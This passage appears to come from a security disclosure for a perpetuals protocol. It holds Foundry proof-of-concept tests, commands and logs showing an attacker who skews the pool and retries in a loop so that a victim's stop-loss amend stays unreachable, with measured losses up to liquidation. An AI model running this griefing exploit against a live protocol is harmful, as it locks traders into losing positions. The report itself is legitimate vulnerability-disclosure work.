        uint64 pid = _victimOpensAndArms(0, 0);
        _logQuote();
        uint256 beforeTrigger = _balance(victim);
        _mustExecute(_trigger(pid, STOP), STOP);
        assertEq(_size(victim), 0, "position closed");
        assertEq(uint8(_status(pid)), uint8(P.PositionProtectionStatus.Executed), "protection executed");
        emit log_named_decimal_uint("victim balance before trigger", beforeTrigger, 6);
        emit log_named_decimal_uint("victim balance after the stop-loss close at 1.10", _balance(victim), 6);
    }

    /// 2. The attacker's skew makes the same attempt fail on the victim's action-charge ceiling. When an honest
    ///    keeper ends the attempt, the documented remedy works: the owner amends and the retry closes.
    function test_02_SkewMakesTheTriggeredCloseFail() public {
        uint64 pid = _victimOpensAndArms(0, 0);
        uint256 snap = vm.snapshotState();
        _mustExecute(_trigger(pid, STOP), STOP);
        uint256 controlBalance = _balance(victim); // same state, no attacker
        vm.revertToState(snap);

        _attackerOpens();
        emit log_named_decimal_uint("pool depth", pool.totalAssets(), 6);
        emit log_named_decimal_uint("attacker deposit", attackerDeposit, 6);
        emit log_named_decimal_uint("attacker SHORT size, tokens", _size(attacker), 18);
        emit log_named_decimal_uint("attacker paid at open (fee, VPI, bounty)", attackerDeposit - _balance(attacker), 6);

        uint64 attempt = _trigger(pid, STOP);
        uint256 afterTrigger = _balance(victim);
        OrderV3Types.ExecutionResult memory r = _execute(attempt, STOP);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "attempt failed");
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "on a ceiling");
        OrderV3Types.FailureDetails memory f = _failure(attempt);
        assertEq(uint8(f.constraint), uint8(OrderV3Types.ConstraintKind.ActionCharge), "the action-charge ceiling");
        assertTrue(_isLatched(pid), "protection Latched");
        assertEq(_size(victim), SIZE, "position still open");
        assertEq(_balance(victim), afterTrigger, "the failed attempt charged nothing");
        uint256 notional = (SIZE * STOP) / 1e20;
        emit log_named_decimal_uint("assessed action charge under skew", f.actual, 6);
        emit log_named_decimal_uint("victim ceiling", f.limit, 6);
        emit log_named_decimal_uint("assessed charge, bps of close notional", (f.actual * 1e6) / notional, 2);

        // A retry by any third party fails the same way while the skew is there.
        vm.prank(bystander);
        attempt = book.retryPositionProtectionClose(pid);
        _mustFail(attempt, STOP);
        assertTrue(_isLatched(pid), "Latched again");

        // Documented remedy, nobody interfering: amend while Latched, retry, close.
        vm.prank(victim);
        book.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        vm.prank(victim);
        attempt = book.retryPositionProtectionClose(pid);
        _mustExecute(attempt, STOP);
        assertEq(_size(victim), 0, "victim out after amending");
        emit log_named_decimal_uint("victim balance, control (closed at 1.10)", controlBalance, 6);
        emit log_named_decimal_uint("victim balance, amend and close at 1.10 under skew", _balance(victim), 6);
        emit log_named_decimal_uint(
            "extra cost of closing under the attacker's skew", controlBalance - _balance(victim), 6
        );
    }

    /// 3. Which ceilings are exposed to the skew variant: 0.44% of close notional fails, 0.50% and unlimited execute.
    function test_03_CeilingSensitivity() public {
        uint256 notional = (SIZE * STOP) / 1e20;
        uint256[3] memory ceilings = [(notional * 44) / 10_000, (notional * 50) / 10_000, type(uint256).max];
        string[3] memory labels = ["ceiling 0.44% of notional", "ceiling 0.50% of notional", "ceiling unlimited"];
        for (uint256 i; i < 3; ++i) {
            uint256 snap = vm.snapshotState();
            uint64 pid = _victimOpensAndArms(ceilings[i], type(uint256).max);
            _attackerOpens();
            OrderV3Types.ExecutionResult memory r = _execute(_trigger(pid, STOP), STOP);
            emit log_named_string(
                labels[i], r.status == OrderV3Types.LifecycleStatus.Failed ? "attempt Failed" : "attempt Executed"
            );
            assertEq(r.status == OrderV3Types.LifecycleStatus.Failed, i == 0, "only the 0.44% ceiling fails");
            vm.revertToState(snap);
        }
    }

    /// 4. The lock. One attacker transaction per cycle keeps the protection Triggered at every transaction
    ///    boundary while the price keeps moving against the victim. After every cycle the owner's amend and every
    ///    other exit revert. Then the attacker stops, the victim gets out, and both sides are settled.
    function test_04_AtomicRetryKeepsAmendUnreachable() public {
        uint64 pid = _victimOpensAndArms(0, 0);
        uint256 snap = vm.snapshotState();
        _mustExecute(_trigger(pid, STOP), STOP);
        uint256 controlBalance = _balance(victim); // same state, no attacker
        vm.revertToState(snap);

        uint256 size = _attackerOpens();
        uint64 attempt = _trigger(pid, STOP);
        uint256 price;
        uint256 gasUsed;
        for (uint256 i; i < 8; ++i) {
            price = STOP + i * 1_000_000; // 1.10 up to 1.17 in steps of 0.01
            uint256 g = gasleft();
            attempt = _cycle(attempt, price, pid);
            gasUsed += g - gasleft();
            _amendReverts(pid);
            _noOtherExit(pid);
        }
        assertEq(_size(victim), SIZE, "victim still in the position");
        emit log_named_uint("attacker transactions (one per cycle)", 8);
        emit log_named_uint("gas per cycle with MockPyth", gasUsed / 8);
        emit log_named_decimal_uint("price when the attacker stops", price, 8);

        // The attacker stops. The victim ends the attempt herself, amends, retries and is closed.
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(victim);
        router.executeOrder(attempt, data);
        vm.prank(victim);
        book.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        vm.prank(victim);
        attempt = book.retryPositionProtectionClose(pid);
        _mustExecute(attempt, price);
        assertEq(_size(victim), 0, "victim out");

        uint256 priceLoss = (SIZE * (price - STOP)) / 1e20;
        emit log_named_decimal_uint("victim balance, control (closed at 1.10)", controlBalance, 6);
        emit log_named_decimal_uint("victim balance, attack (closed at 1.17)", _balance(victim), 6);
        emit log_named_decimal_uint("victim loss versus control", controlBalance - _balance(victim), 6);
        emit log_named_decimal_uint("  further price move while locked", priceLoss, 6);
        emit log_named_decimal_uint("  extra fees and VPI", controlBalance - _balance(victim) - priceLoss, 6);
        _attackerCloses(0, size, price);
        emit log_named_decimal_int("attacker cost, market move excluded", _attackerCost(size, price), 6);
    }

    /// 5. The owner's only way out while the attacker is active: act as her own keeper and get two transactions
    ///    in without the attacker's retry between them.
    function test_05_OwnerEscapeNeedsTwoUninterruptedTransactions() public {
        uint64 pid = _victimOpensAndArms(0, 0);
        _attackerOpens();
        uint64 attempt = _cycle(_trigger(pid, STOP), STOP, pid);

        // Same block as the attacker's cycle: the new attempt cannot be executed yet, so there is no exit at all.
        bytes[] memory sameBlock = new bytes[](1);
        sameBlock[0] = abi.encode(STOP);
        vm.prank(victim);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attempt, sameBlock);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Pending), "attempt still pending");
        _amendReverts(pid);
        _noOtherExit(pid);

        // Not locked: collateral outside the position. The victim can still withdraw free balance.
        vm.prank(victim);
        clearinghouse.withdraw(victim, 1000e6);
        assertEq(settlementToken.balanceOf(victim), 1000e6, "free balance stays withdrawable");
        emit log_string("free balance outside the position: 1,000 USDG withdrawn while locked");

        // Next block, transaction 1: the owner executes the failing attempt herself. Protection is Latched.
        bytes[] memory data = _mockPythUpdateData(STOP);
        vm.prank(victim);
        r = router.executeOrder(attempt, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "fails for the owner too");
        assertTrue(_isLatched(pid), "Latched");
        _noOtherExit(pid);

        // Case A: the attacker's retry is sequenced before the owner's transaction 2. The amend reverts again.
        uint256 snap = vm.snapshotState();
        vm.prank(attacker);
        book.retryPositionProtectionClose(pid);
        _amendReverts(pid);
        emit log_string("case A, attacker retry between the two transactions: amend reverted");
        vm.revertToState(snap);

        // Case B: nothing in between. Transaction 2 amends, then the retry closes the position.
        uint256 beforeClose = _balance(victim);
        vm.prank(victim);
        book.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        vm.prank(victim);
        attempt = book.retryPositionProtectionClose(pid);
        _mustExecute(attempt, STOP);
        assertEq(_size(victim), 0, "victim out");
        emit log_string("case B, two uninterrupted transactions: amend succeeded, position closed");
        emit log_named_decimal_uint("victim balance before the close", beforeClose, 6);
        emit log_named_decimal_uint("victim balance after the close at 1.10 under skew", _balance(victim), 6);
    }

    /// 6. Duration and holding cost. Against an owner who does not execute attempts herself, one transaction per
    ///    60 s execution window (clearInvalidOrders plus retry, no price data) holds the lock for over an hour.
    function test_06_ExpiryVariantHoldsOverOneHour() public {
        uint64 pid = _victimOpensAndArms(0, 0);
        uint256 size = _attackerOpens();
        uint64 attempt = _trigger(pid, STOP);

        uint256 snap = vm.snapshotState();
        _attackerCloses(attempt, size, STOP);
        int256 costNow = _attackerCost(size, STOP); // if the attacker unwound immediately
        vm.revertToState(snap);

        uint256 start = vm.getBlockTimestamp();
        uint256 txs;
        while (vm.getBlockTimestamp() - start < 3700) {
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(deadline);
            _amendReverts(pid); // live attempt, last second of its window
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(deadline) + 1);
            uint256 cleared;
            vm.prank(attacker);
            (cleared, attempt) = locker.clearAndRetry(router, book, attempt, pid);
            assertEq(cleared, 1, "expired attempt cleared");
            _amendReverts(pid);
            ++txs;
        }
        _noOtherExit(pid);
        assertEq(_size(victim), SIZE, "victim still in the position");
        emit log_named_uint("seconds the amend stayed unreachable", vm.getBlockTimestamp() - start);
        emit log_named_uint("attacker transactions", txs);

        _refreshMark(STOP);
        _attackerCloses(attempt, size, STOP);
        int256 costAfter = _attackerCost(size, STOP);
        emit log_named_decimal_int("attacker cost, immediate unwind", costNow, 6);
        emit log_named_decimal_int("attacker cost, unwind after the hold", costAfter, 6);
        emit log_named_decimal_int("attacker holding cost for the period", costAfter - costNow, 6);
    }

    /// 7. What ends it. A price back inside the stop does not (the ceiling is hit by skew, and a retry never
    ///    re-checks the trigger). Removing the skew does: the next retry closes inside the original ceilings.
    function test_07_EndConditions() public {
        uint64 pid = _victimOpensAndArms(0, 0);
        uint256 size = _attackerOpens();
        _mustFail(_trigger(pid, STOP), 105_000_000);
        assertTrue(_isLatched(pid), "still failing with the price back at 1.05");
        emit log_string("price back at 1.05, skew still there: attempt Failed, protection Latched");

        _refreshMark(STOP);
        vm.prank(bystander);
        uint64 attempt = book.retryPositionProtectionClose(pid);
        _attackerCloses(attempt, size, STOP);
        vm.prank(bystander);
        attempt = book.retryPositionProtectionClose(pid);
        _mustExecute(attempt, STOP);
        assertEq(_size(victim), 0, "closes once the skew is gone");
        emit log_string("attacker position closed: the next retry Executed inside the original ceilings");
    }

    /// 8. Worst case for the victim: the price reaches her liquidation level while the lock is held.
    function test_08_LiquidationWhileLocked() public {
        uint64 pid = _victimOpensAndArms(0, 0);
        _attackerOpens();
        uint256 beforeTrigger = _balance(victim);
        uint64 attempt = _trigger(pid, STOP);
        uint256[3] memory path = [uint256(110_000_000), 115_000_000, 119_000_000];
        for (uint256 i; i < 3; ++i) {
            attempt = _cycle(attempt, path[i], pid);
            _amendReverts(pid);
        }
        _mockPythUpdateData(120_000_000);
        bytes[] memory data = _livePriceData(120_000_000);
        vm.prank(keeper);
        router.executeLiquidation(victim, data);
        assertEq(_size(victim), 0, "victim liquidated");
        assertEq(uint8(_status(pid)), uint8(P.PositionProtectionStatus.Liquidated), "protection ends Liquidated");
        emit log_named_decimal_uint("victim balance before trigger", beforeTrigger, 6);
        emit log_named_decimal_uint("victim balance after liquidation at 1.20", _balance(victim), 6);
        emit log_named_decimal_uint("victim loss from trigger to liquidation", beforeTrigger - _balance(victim), 6);
    }

    /// 9. Variant without attacker capital, frozen market. Precondition that the attacker does not create: the
    ///    protection is already Latched when the market freezes (here its first attempt expired unexecuted on
    ///    Friday). The victim's ceilings are the ratios of the project's client fixtures: action charge 0.50% and
    ///    explicit fees 1.50% of close notional. The frozen close costs the 0.50% spread plus the fee, so every
    ///    frozen attempt fails, and clearInvalidOrders plus retry once per window keeps the amend unreachable.
    function test_09_FrozenMarketVariantNeedsNoCapital() public {
        vm.warp(1_709_899_200); // Friday 2024-03-08 12:00 UTC, market live
        _refreshMark(PRICE_OPEN);
        uint256 notional = (SIZE * STOP) / 1e20;
        uint64 pid = _victimOpensAndArms((notional * 50) / 10_000, (notional * 150) / 10_000);
        uint64 attempt = _trigger(pid, STOP);
        vm.warp(uint256(router.lifecycleBook().orderTiming(attempt).executionDeadline) + 1);
        vm.prank(keeper);
        router.executeOrder(attempt, new bytes[](0)); // expiry, no price needed
        assertTrue(_isLatched(pid), "Latched before the weekend");

        vm.warp(1_709_937_000); // Friday 22:30 UTC
        assertTrue(engine.isOracleFrozen(), "market frozen");
        vm.prank(attacker);
        locker = new RetryLocker();
        vm.prank(attacker);
        attempt = book.retryPositionProtectionClose(pid);

        uint256 snap = vm.snapshotState();
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attempt, new bytes[](0));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "frozen attempt fails");
        OrderV3Types.FailureDetails memory f = _failure(attempt);
        assertEq(uint8(f.constraint), uint8(OrderV3Types.ConstraintKind.ActionCharge), "the action-charge ceiling");
        emit log_named_decimal_uint("assessed action charge, frozen market", f.actual, 6);
        emit log_named_decimal_uint("victim ceiling (0.50% of notional)", f.limit, 6);
        vm.revertToState(snap);

        uint256 start = vm.getBlockTimestamp();
        uint256 txs;
        while (vm.getBlockTimestamp() - start < 3700) {
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(deadline) + 1);
            uint256 cleared;
            vm.prank(attacker);
            (cleared, attempt) = locker.clearAndRetry(router, book, attempt, pid);
            assertEq(cleared, 1, "expired attempt cleared");
            _amendReverts(pid);
            ++txs;
        }
        _noOtherExit(pid);
        assertTrue(engine.isOracleFrozen(), "still frozen");
        assertEq(_size(victim), SIZE, "victim still in the position");
        assertEq(_balance(attacker), 0, "the attacker holds no funds in the protocol");
        emit log_named_uint("seconds the amend stayed unreachable", vm.getBlockTimestamp() - start);
        emit log_named_uint("attacker transactions", txs);
    }

}

/// @dev Same forced failure at release pool depth: Junior 10M plus Senior 40M USDG.
contract ReleaseDepthAmendLockPoC is AmendLockBase {

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 40_000_000e6;
    }

    /// 10. Attacker capital and cost at a 50M pool, same victim.
    function test_10_ReleaseDepthCostAndThreshold() public {
        uint64 pid = _victimOpensAndArms(0, 0);
        _logQuote();
        uint256 size = _attackerOpens();
        emit log_named_decimal_uint("pool depth", pool.totalAssets(), 6);
        emit log_named_decimal_uint("attacker SHORT size, tokens", size, 18);
        emit log_named_decimal_uint("attacker deposit", attackerDeposit, 6);
        emit log_named_decimal_uint("attacker paid at open (fee, VPI, bounty)", attackerDeposit - _balance(attacker), 6);
        uint64 attempt = _trigger(pid, STOP);
        _mustFail(attempt, STOP);
        assertTrue(_isLatched(pid), "protection Latched");
        OrderV3Types.FailureDetails memory f = _failure(attempt);
        emit log_named_decimal_uint("assessed action charge under skew", f.actual, 6);
        emit log_named_decimal_uint("victim ceiling", f.limit, 6);
        emit log_named_decimal_uint(
            "assessed charge, bps of close notional", (f.actual * 1e6) / ((SIZE * STOP) / 1e20), 2
        );
        _attackerCloses(0, size, STOP);
        emit log_named_decimal_int("attacker cost, immediate unwind", _attackerCost(size, STOP), 6);
    }

}
```

4. Run the control, the forced failure and the ceiling sensitivity. The first run compiles the perps package with via-IR and takes a minute or more. FOUNDRY_SPARSE_MODE only limits compilation to the files this test needs.

```bash
FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path test/poc/ProtectionAmendLock.t.sol --match-contract ProtectionAmendLockPoC --match-test "test_0[123]_" -vv
```

Output of my run (compiler output above it left out):

```text
Ran 3 tests for test/poc/ProtectionAmendLock.t.sol:ProtectionAmendLockPoC
[PASS] test_01_Control_StopLossClosesWithoutAttacker() (gas: 4618828)
Logs:
  close charge quoted at arming: 3.900999
  victim fee ceilings (3x the quote): 11.702997
  victim balance before trigger: 19995.300999
  victim balance after the stop-loss close at 1.10: 18991.200000

[PASS] test_02_SkewMakesTheTriggeredCloseFail() (gas: 12885251)
Logs:
  pool depth: 1002753.930213
  attacker deposit: 10020.004990
  attacker SHORT size, tokens: 398700.000000000000000000
  attacker paid at open (fee, VPI, bounty): 913.111212
  assessed action charge under skew: 51.906870
  victim ceiling: 11.702997
  assessed charge, bps of close notional: 47.18
  victim balance, control (closed at 1.10): 18991.200000
  victim balance, amend and close at 1.10 under skew: 18943.194129
  extra cost of closing under the attacker's skew: 48.005871

[PASS] test_03_CeilingSensitivity() (gas: 20816291)
Logs:
  ceiling 0.44% of notional: attempt Failed
  ceiling 0.50% of notional: attempt Executed
  ceiling unlimited: attempt Executed

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 39.10ms (50.57ms CPU time)

Ran 1 test suite in 46.16ms (39.10ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

5. Run the lock and the owner's exits:

```bash
FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path test/poc/ProtectionAmendLock.t.sol --match-contract ProtectionAmendLockPoC --match-test "test_0[45]_" -vv
```

```text
Ran 2 tests for test/poc/ProtectionAmendLock.t.sol:ProtectionAmendLockPoC
[PASS] test_04_AtomicRetryKeepsAmendUnreachable() (gas: 19354797)
Logs:
  attacker transactions (one per cycle): 8
  gas per cycle with MockPyth: 1231077
  price when the attacker stops: 1.17000000
  victim balance, control (closed at 1.10): 18991.200000
  victim balance, attack (closed at 1.17): 18236.675417
  victim loss versus control: 754.524583
    further price move while locked: 700.000000
    extra fees and VPI: 54.524583
  attacker cost, market move excluded: 346.274574

[PASS] test_05_OwnerEscapeNeedsTwoUninterruptedTransactions() (gas: 9875675)
Logs:
  free balance outside the position: 1,000 USDG withdrawn while locked
  case A, attacker retry between the two transactions: amend reverted
  case B, two uninterrupted transactions: amend succeeded, position closed
  victim balance before the close: 18995.100999
  victim balance after the close at 1.10 under skew: 17943.194129

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 35.54ms (42.84ms CPU time)

Ran 1 test suite in 36.28ms (35.54ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

6. Run the one-hour hold, the end conditions and the liquidation case:

```bash
FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path test/poc/ProtectionAmendLock.t.sol --match-contract ProtectionAmendLockPoC --match-test "test_0[678]_" -vv
```

```text
Ran 3 tests for test/poc/ProtectionAmendLock.t.sol:ProtectionAmendLockPoC
[PASS] test_06_ExpiryVariantHoldsOverOneHour() (gas: 56845625)
Logs:
  seconds the amend stayed unreachable: 3721
  attacker transactions: 61
  attacker cost, immediate unwind: 335.108742
  attacker cost, unwind after the hold: 336.031334
  attacker holding cost for the period: 0.922592

[PASS] test_07_EndConditions() (gas: 10539350)
Logs:
  price back at 1.05, skew still there: attempt Failed, protection Latched
  attacker position closed: the next retry Executed inside the original ceilings

[PASS] test_08_LiquidationWhileLocked() (gas: 9797111)
Logs:
  victim balance before trigger: 19995.300999
  victim balance after liquidation at 1.20: 17999.600000
  victim loss from trigger to liquidation: 1995.700999

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 64.97ms (87.52ms CPU time)

Ran 1 test suite in 65.91ms (64.97ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

7. Run the frozen-market variant:

```bash
FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path test/poc/ProtectionAmendLock.t.sol --match-contract ProtectionAmendLockPoC --match-test "test_09_" -vv
```

```text
Ran 1 test for test/poc/ProtectionAmendLock.t.sol:ProtectionAmendLockPoC
[PASS] test_09_FrozenMarketVariantNeedsNoCapital() (gas: 53747335)
Logs:
  assessed action charge, frozen market: 58.904793
  victim ceiling (0.50% of notional): 55.000000
  seconds the amend stayed unreachable: 3721
  attacker transactions: 61

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 54.53ms (45.93ms CPU time)

Ran 1 test suite in 55.35ms (54.53ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

8. Run the forced failure at release pool depth:

```bash
FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path test/poc/ProtectionAmendLock.t.sol --match-contract ReleaseDepthAmendLockPoC -vv
```

```text
Ran 1 test for test/poc/ProtectionAmendLock.t.sol:ReleaseDepthAmendLockPoC
[PASS] test_10_ReleaseDepthCostAndThreshold() (gas: 10711288)
Logs:
  close charge quoted at arming: 4.390001
  victim fee ceilings (3x the quote): 13.170003
  pool depth: 50039637.210553
  attacker SHORT size, tokens: 19410700.000000000000000000
  attacker deposit: 500020.000099
  attacker paid at open (fee, VPI, bounty): 45401.680554
  assessed action charge under skew: 51.324595
  victim ceiling: 13.170003
  assessed charge, bps of close notional: 46.65
  attacker cost, immediate unwind: 16305.223316

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.57ms (10.88ms CPU time)

Ran 1 test suite in 20.38ms (19.57ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The attached screenshot shows steps 4 to 8 of this same run in the terminal.

What the output shows:

- test_01: without the attacker the triggered stop-loss closes at 1.10 inside the victim's ceilings.
- test_02: with the attacker's SHORT in place the same attempt ends Failed on the action-charge ceiling, 51.906870 USDG assessed against a ceiling of 11.702997, and the protection is Latched. A retry by a bystander fails the same way. With an honest keeper and nobody interfering, the documented remedy works: the owner amends, retries and is closed, 48.005871 USDG worse off than the control.
- test_03: a ceiling of 0.44 % of close notional fails under the skew, 0.50 % and unlimited execute.
- test_04: eight attacker transactions while the price goes from 1.10 to 1.17. After each one the test asserts that the owner's amend reverts with OrderRouter__ProtectionNotLatched and that manual close, cancel, cancel-and-close and replace revert. When the attacker stops, the victim gets out 754.524583 USDG worse off than the control. The attacker is out 346.274574 USDG.
- test_05: in the block of the attacker's transaction the owner has no exit. In a later block she can execute the failing attempt herself. If the attacker's retry comes before her amend, the amend reverts again (case A). If nothing comes between, the amend succeeds and she is closed (case B). Free balance outside the position stays withdrawable throughout.
- test_06: one clearInvalidOrders plus retry transaction per 60 s window, with no price data, keeps the amend unreachable for 3,721 seconds. Holding the position for that time costs the attacker 0.922592 USDG.
- test_07: a price back at 1.05 does not end it. Closing the attacker's position does.
- test_08: the price reaches 1.20 while the lock is held and the victim is liquidated, losing 1,995.700999 USDG from the trigger.
- test_09: frozen market, attacker with no funds in the protocol. A protection that was already Latched before the freeze, with a ceiling of 0.50 % of notional, fails every frozen attempt (58.904793 against 55.000000) and the amend stays unreachable for 3,721 seconds with 61 transactions.
- test_10: at a 50M pool the forced failure needs a SHORT of 19,410,700 tokens, funded here with 500,020.000099 USDG, and costs the attacker 16,305.223316 USDG to open and unwind. The assessed charge is 46.65 bps of the victim's close notional.

Impact: a trader whose stop-loss has triggered, and whose close attempt fails on her own fee ceilings, can be kept from the only remedy the protocol gives her, changing those ceilings, by any account that ends each attempt and retries in one transaction. While that lasts she cannot close, cancel or replace, and she carries the position past her stop: 754.524583 USDG more loss in test 4 and liquidation of her margin in test 8, at a cost to the attacker of a few hundred USDG in fees at this pool size, or of gas alone in a frozen market. The attacker gains nothing. A victim who executes the attempt herself and gets her amend in as the next transaction escapes, which is why I select Griefing and not a freeze.
